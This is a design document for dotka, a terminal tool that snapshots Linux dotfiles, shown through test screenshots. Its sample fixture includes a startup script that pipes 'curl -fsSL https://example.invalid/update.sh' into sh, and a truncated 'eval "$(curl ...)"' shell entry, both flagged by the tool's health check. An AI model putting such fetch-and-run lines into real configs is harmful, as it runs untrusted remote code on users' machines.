# dotka UI design

> Every screen in this doc is **real output** at 80x24, straight from the golden tests
> (`internal/tui/testdata/*.txt`). If the UI changes, the tests fail until the goldens are
> regenerated (`go test ./internal/tui -update`), so these can't drift out of date.

## Who it's for

Intermediate, kinda-new Linux folks (Hyprland ricers, mostly). Comfy in a terminal, but
no reason to know what an XDG autostart entry or a systemd user unit is. The UI answers
five questions, one per tab:

| Tab | The question |
|---|---|
| 1 Overview | How am I doing? Anything changed? Anything wrong? What can I do? |
| 2 Changes | What exactly changed since my last save point? |
| 3 History | What save points do I have, and what would going back do? |
| 4 Startup | What runs by itself when I log in or open a terminal? |
| 5 Health | Anything broken or sketchy in my config? |

Open it with `dotka` (no args, in a terminal) or `dotka tui`. In a pipe or script, plain
`dotka` still prints the help.

## Design rules

- **Explain, don't just list.** The detail pane translates everything: `hypr-autostart`
  becomes "Starts at login (Hyprland)", and health findings say what they mean and what
  to do.
- **ASCII only.** `+ - |` borders, `> * [!] [?] [x] [-]` markers, no emojis or box
  drawing, same as the CLI, so it looks identical on a bare TTY.
- **Color is never the only signal.** Every state has a symbol or a word, and the
  selected row has `>` on top of reverse video. With `NO_COLOR` it's still fully usable.
- **16 ANSI colors**: green (added), yellow (modified/heads-up), red (removed/risk), cyan
  (focus), grey (secondary). They follow your terminal theme, light or dark.
- **Every action asks first** and shows what's about to happen. Going back always saves
  where you are first.

## Layout

```
line 1       header       dotka  <home>  [sandbox]                save point #N  X unsaved
line 2       tabs          1 Overview   2 Changes (X)   3 History (N)   4 Startup (N)   5 Health (N!)
line 3       rule         ------------------------------------------------------------------
lines 4..    body         full-width overview | list + detail | centered dialog
2nd to last  status       -- result of the last action -----------------------------------
last         keys         what you can press right now
```

- **List + detail**: the list gets 45% of the width (between 32 and 60 columns), the
  detail the rest. The focused pane has `>` in its title.
- **Minimum 70x20.** Smaller than that you get a friendly message, never a broken screen.
  Tested from 70x20 up to 200x60, plus live resizing.
- Long paths get trimmed **from the left** (`.../Dotka/.sandbox/home`), so the tag and
  the current save point always stay visible.

## Screens

### 1 Overview

Unsaved changes (only the rows that have something), health, and **what you can do
right now**. The suggestions change with the situation: no changes, changes, not set up.

```
 dotka  .../proyectos/Dotka/.sandbox/home  [sandbox]  save point #1  11 unsaved 
  1 Overview   2 Changes (11)   3 History (3)   4 Startup (5)   5 Health (3!)   
--------------------------------------------------------------------------------
                                                                                
  Unsaved changes since save point #1 "initial state"  saved Nov 14 19:46       
                                                                                
    Files     +2   ~2   -0                                                      
    Packages  +3        -0                                                      
    Startup   +3        -1   [!] 1 new item(s) download and run code            
                                                                                
  Health                                                                        
    3 problems, 1 note   see tab 5                                              
                                                                                
  What you can do                                                               
    s save the current state as a new save point                                
    u discard these changes and go back to #1                                   
    2 review the changes one by one                                             
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
--------------------------------------------------------------------------------
 1-5 tabs   s save   u discard changes   r refresh   ? help   q quit            
```

### 2 Changes

Grouped into **Files / Packages / Runs at startup**. New folders collapse into one row.
The detail says what going back would do and shows the diff.

```
 dotka  .../proyectos/Dotka/.sandbox/home  [sandbox]  save point #1  11 unsaved 
  1 Overview   2 Changes (11)   3 History (3)   4 Startup (5)   5 Health (3!)   
--------------------------------------------------------------------------------
 > Unsaved changes                   | .config/hypr/hyprland.lua                
                                     |                                          
 Files (4)                           | Modified                                 
 > ~ .config/hypr/hyprland.lua       | Its content changed. Going back restores 
   ~ .config/kitty/kitty.conf [!]... | the saved version.                       
   + .config/waybar/ 2 files         |                                          
   + .local/bin/rice-autoupdate.sh   | --- saved                                
 Packages (3)                        | +++ now                                  
   + cava                            | @@ -1,3 +1,4 @@                          
   + swww                            |  hl.on("hyprland.start", function()      
   + waybar                          | -    hl.exec_cmd("qs -p ~/.config/quic...
 Runs at startup (4)                 | +    hl.exec_cmd("waybar")               
   +     waybar                      | +    hl.exec_cmd("swww-daemon")          
   + [?] ~/.local/bin/rice-autoup... |  end)                                    
   + [!] eval "$(curl -fsSL https... |                                          
   -     qs -p ~/.config/quickshe... |                                          
                                     |                                          
                                     |                                          
                                     |                                          
--------------------------------------------------------------------------------
 j/k move   tab detail   s save   u discard all   r refresh   ? help   q quit   
```

Selecting something that now runs (or stopped running) at startup:

```
 dotka  .../proyectos/Dotka/.sandbox/home  [sandbox]  save point #1  11 unsaved 
  1 Overview   2 Changes (11)   3 History (3)   4 Startup (5)   5 Health (3!)   
--------------------------------------------------------------------------------
 > Unsaved changes                   | Starts at login (Hyprland)               
                                     |                                          
 Files (4)                           | Removed: this no longer runs automatic...
   ~ .config/hypr/hyprland.lua       |                                          
   ~ .config/kitty/kitty.conf [!]... | Command                                  
   + .config/waybar/ 2 files         | qs -p ~/.config/quickshell/bar/shell.qml 
   + .local/bin/rice-autoupdate.sh   |                                          
 Packages (3)                        | What it is                               
   + cava                            | Hyprland starts this program once, when  
   + swww                            | you log in (inside                       
   + waybar                          | hl.on("hyprland.start") in your Lua      
 Runs at startup (4)                 | config).                                 
   +     waybar                      |                                          
   + [?] ~/.local/bin/rice-autoup... | Defined in                               
   + [!] eval "$(curl -fsSL https... | .config/hypr/hyprland.lua:5              
 > -     qs -p ~/.config/quickshe... |                                          
                                     |                                          
                                     |                                          
                                     |                                          
--------------------------------------------------------------------------------
 j/k move   tab detail   s save   u discard all   r refresh   ? help   q quit   
```

### 3 History

`*` is the current save point. The detail says how it was made (by you, by `dotka run`,
automatically before a rollback) and **what going back there would do**.

```
 dotka  .../proyectos/Dotka/.sandbox/home  [sandbox]  save point #1  11 unsaved 
  1 Overview   2 Changes (11)   3 History (3)   4 Startup (5)   5 Health (3!)   
--------------------------------------------------------------------------------
 > Save points (newest first)        | #2 super-rice                            
                                     |                                          
     #3   Nov 14 20:06  before ro... | Created   2026-11-14 19:56               
 >   #2   Nov 14 19:56  super-rice   | How       created by `dotka run` after   
   * #1   Nov 14 19:46  initial s... |           running:                       
                                     |           ./super-rice/install.sh        
                                     | Contains  2 files, 2 packages, 0 startup 
                                     |           items                          
                                     |                                          
                                     | Going back here would                    
                                     |   ~ revert 1 file                        
                                     |   - remove 3 newer files                 
                                     |                                          
                                     | b go back here   x forget this save point
                                     |                                          
                                     |                                          
                                     |                                          
                                     |                                          
                                     |                                          
--------------------------------------------------------------------------------
 j/k move   b go back here   x forget   r refresh   ? help   q quit             
```

### 4 Startup

Grouped by where it comes from. `[!]` downloads and runs code, `[?]` runs a local script.

```
 dotka  .../proyectos/Dotka/.sandbox/home  [sandbox]  save point #1  11 unsaved 
  1 Overview   2 Changes (11)   3 History (3)   4 Startup (5)   5 Health (3!)   
--------------------------------------------------------------------------------
 > Runs automatically                | Starts at login (Hyprland)               
                                     |                                          
 Hyprland (3)                        | Command                                  
       waybar                        | ~/.local/bin/rice-autoupdate.sh          
 > [?] ~/.local/bin/rice-autoupda... |                                          
       dunst                         | What it is                               
 User services (1)                   | Hyprland starts this program once, when  
   [?] rice-sync.service             | you log in (inside                       
 Shell (1)                           | hl.on("hyprland.start") in your Lua      
   [!] eval "$(curl -fsSL https:/... | config).                                 
                                     |                                          
                                     | Defined in                               
                                     | .config/hypr/hyprland.lua:6              
                                     |                                          
                                     | [?] Runs a local script                  
                                     | Note: it runs a script stored in your    
                                     | home. Read the script to know what it    
                                     | does (dotka doctor checks it for you).   
                                     |                                          
--------------------------------------------------------------------------------
 j/k move   tab detail   r refresh   ? help   q quit                            
```

### 5 Health

Problems `[x]` and notes `[-]`, each with what it means and what to do about it.

```
 dotka  .../proyectos/Dotka/.sandbox/home  [sandbox]  save point #1  11 unsaved 
  1 Overview   2 Changes (11)   3 History (3)   4 Startup (5)   5 Health (3!)   
--------------------------------------------------------------------------------
 > Health check                      | Startup script downloads code            
                                     |                                          
 Problems (3)                        | [x] Problem                              
 > [x] Startup script downloads c... | downloads and runs code at every login   
   [x] Missing program    hyprlan... | (started from                            
   [x] Secret readable by others ... | .config/hypr/hyprland.lua:6): curl -fsSL 
 Notes (1)                           | https://example.invalid/update.sh | sh   
   [-] Possible leftover  vesktop    |                                          
                                     | Where                                    
                                     | .local/bin/rice-autoupdate.sh:2          
                                     |                                          
                                     | What it means                            
                                     | A script that runs automatically         
                                     | downloads code from the internet and runs
                                     | it.                                      
                                     |                                          
                                     | What you can do                          
                                     | read the script; remove it from startup  
                                     | if you do not trust the source           
--------------------------------------------------------------------------------
 j/k move   tab detail   r refresh   ? help   q quit                            
```

## Dialogs

**Going back / discarding changes.** Shows the plan before touching anything. Packages
are suggested, never run:

```
 dotka  .../proyectos/Dotka/.sandbox/home  [sandbox]  save point #1  11 unsaved 
  1 Overview   2 Changes (11)   3 History (3)   4 Startup (5)   5 Health (3!)   
--------------------------------------------------------------------------------
    +----------------------------------------------------------------------+    
    | Discard unsaved changes (back to #1)?                                |    
    |                                                                      |    
    | Your current state is saved first, so this can be undone.            |    
    |                                                                      |    
    | Files                                                                |    
    |   ~ restore 1 file                                                   |    
    |   - remove 1 file added since then                                   |    
    |                                                                      |    
    | Runs at startup                                                      |    
    |   1 item will no longer run                                          |    
    |                                                                      |    
    | Packages                                                             |    
    | Dotka never changes packages. If you want, remove the ones installed |    
    | since then yourself:                                                 |    
    |   sudo pacman -Rns waybar swww                                       |    
    |                                                                      |    
    | y go back   n cancel                                                 |    
    +----------------------------------------------------------------------+    
--------------------------------------------------------------------------------
 y confirm   n cancel                                                           
```

**Saving a point** (inside the text field `q` is just a letter, it won't quit):

```
 dotka  .../proyectos/Dotka/.sandbox/home  [sandbox]  save point #1  11 unsaved 
  1 Overview   2 Changes (11)   3 History (3)   4 Startup (5)   5 Health (3!)   
--------------------------------------------------------------------------------
                                                                                
                                                                                
                                                                                
                                                                                
    +----------------------------------------------------------------------+    
    | Save a point                                                         |    
    |                                                                      |    
    | Describe this save point (optional), for example: before trying X's  |    
    | dots                                                                 |    
    |                                                                      |    
    | > before_                                                            |    
    |                                                                      |    
    | enter save   esc cancel                                              |    
    +----------------------------------------------------------------------+    
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
--------------------------------------------------------------------------------
 enter save   esc cancel                                                        
```

**Help (`?`):**

```
 dotka  .../proyectos/Dotka/.sandbox/home  [sandbox]  save point #1  11 unsaved 
  1 Overview   2 Changes (11)   3 History (3)   4 Startup (5)   5 Health (3!)   
--------------------------------------------------------------------------------
                                                                                
    +----------------------------------------------------------------------+    
    | Keys                                                                 |    
    |                                                                      |    
    | 1-5  left/right  switch tab                                          |    
    | j/k  up/down     move in the list (or scroll the detail)             |    
    | tab  enter       move between the list and the detail                |    
    | esc              back to the list / close                            |    
    | s                save the current state as a save point              |    
    | u                discard unsaved changes                             |    
    | b                History: go back to the selected save point         |    
    | x                History: forget the selected save point             |    
    | i                set dotka up (first time)                           |    
    | r                refresh                                             |    
    | q  ctrl+c        quit                                                |    
    |                                                                      |    
    | Every change asks first, and going back can always be undone.        |    
    +----------------------------------------------------------------------+    
                                                                                
--------------------------------------------------------------------------------
 any key close                                                                  
```

## Special states

**First run**, before dotka is set up:

```
 dotka  /home/u                                                  not set up yet 
  1 Overview   2 Changes   3 History   4 Startup (5)   5 Health (3!)            
--------------------------------------------------------------------------------
                                                                                
  Welcome to dotka                                                              
  Dotka keeps save points of your Linux configuration. Before trying someone's  
  dotfiles, save a point; afterwards dotka shows exactly what changed (files,   
  packages, what runs at login) and lets you go back.                           
                                                                                
  i set up dotka here (saves your current state as save point #1)               
                                                                                
  Health                                                                        
    3 problems, 1 note   see tab 5                                              
                                                                                
  What you can do                                                               
    4 see what runs automatically when you log in                               
    5 check your configuration for problems                                     
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
--------------------------------------------------------------------------------
 1-5 tabs   i set up   r refresh   ? help   q quit                              
```

**Setting up** (`i`). Same beta notice as `dotka init` on the CLI:

```
 dotka  /home/u                                                  not set up yet 
  1 Overview   2 Changes   3 History   4 Startup (5)   5 Health (3!)            
--------------------------------------------------------------------------------
                                                                                
                                                                                
    +----------------------------------------------------------------------+    
    | Set up dotka (beta)                                                  |    
    |                                                                      |    
    | Heads up: dotka is beta software. Here's exactly what happens:       |    
    |   - creates a private store at                                       |    
    |     /home/u/.local/share/dotka                                       |    
    |   - copies your tracked config files into it (secrets skipped)       |    
    |   - saves that as save point #1                                      |    
    |                                                                      |    
    | None of your files change now. Later, only going back and forgetting |    
    | change things, and both show a plan and ask first.                   |    
    |                                                                      |    
    | y set up   n cancel                                                  |    
    +----------------------------------------------------------------------+    
                                                                                
                                                                                
                                                                                
--------------------------------------------------------------------------------
 y confirm   n cancel                                                           
```

**Terminal too small:**

```
                                                  
                                                  
                                                  
                                                  
                Terminal too small                
                                                  
  dotka needs at least 70x20, this one is 50x15.  
     Make the window bigger, or use the dotka     
              commands (dotka help).              
                                                  
                      q quit                      
                                                  
                                                  
                                                  
                                                  
```

Plus: **loading** ("Scanning your home..."), **error** (message + `r retry`), empty lists
that explain *why* they're empty, and a status line with the result of every action
(green if it worked, red if it didn't).

## Keys

| Key | Action |
|---|---|
| `1`-`5`, left/right, `h`/`l` | switch tab |
| `j`/`k`, up/down | move in the list (or scroll the detail when it has focus) |
| `PgUp`/`PgDn`, `g`/`G` | half page / top / bottom |
| `Tab`, `Enter` | jump from the list to the detail (`Tab` again to go back) |
| `Esc` | back to the list / close |
| `s` | save a point (optional description) |
| `u` | discard unsaved changes (back to the current save point) |
| `b` | History: go back to the selected save point |
| `x` | History: forget the selected save point |
| `i` | set dotka up the first time |
| `r` | refresh |
| `?` | help |
| `q`, `Ctrl+C` | quit (`Ctrl+C` always works) |

The bottom line always shows the keys that work right now. Inside dialogs it switches
to `y confirm / n cancel`, `enter save / esc cancel` or `any key close`.

## Architecture

```
Backend (all I/O)  ->  tea.Cmd  ->  messages  ->  Update (pure state)  ->  View (pure render)
```

| File | Job |
|---|---|
| `internal/tui/backend.go` | `Backend` interface + `Real`: loads data, diffs, actions (snap, rollback, forget, init) |
| `model.go` | state, messages, async commands |
| `update.go` | keys, navigation, dialogs, actions (no I/O) |
| `screens.go` | rows of each list + detail pane content |
| `view.go` | layout: header, tabs, body, dialogs, footer, special states |
| `explain.go` | the plain-words text |
| `theme.go` | palette + width helpers (truncates by display width, not bytes) |

Deps: `bubbletea` and `lipgloss`. No `bubbles`, the components are few and simple.

## Testing

- **Golden tests** for every screen at 80x24 (the screenshots above).
- **Renders at 70x20, 80x24, 120x40 and 200x60** on every tab, with detail focus and
  with dialogs open: no line wider than the terminal, all output ASCII.
- **Interaction**: the cursor skips headers; saving cancels with `Esc`; `q` types inside
  the text field; going back and forgetting need `y`; forgetting the current save point is
  refused; scrolling keeps the cursor visible; `Esc` + a key (which some terminals send
  as `Alt+key`) doesn't lose the key.
- **Real backend** against a sandbox: `DOTKA_TUI_TEST_HOME=... go test ./internal/tui -run Real -v`.
- **Real pty**: startup, navigation, saving from the dialog, clean exit (leaves the alt
  screen and restores the cursor), resizing below the minimum and back, and `NO_COLOR`
  with zero style codes.

## Known limitations

- No mouse (everything works from the keyboard).
- `dotka run` can't be launched from the UI yet: run it in the terminal, then check the
  result in the UI.
- On startup Bubble Tea/termenv asks the terminal for its background color, using a
  cursor-position query as a fence. Real terminals answer right away (Linux console
  included). A terminal that answered neither would make startup wait ~5 seconds.
- English only, like the CLI.
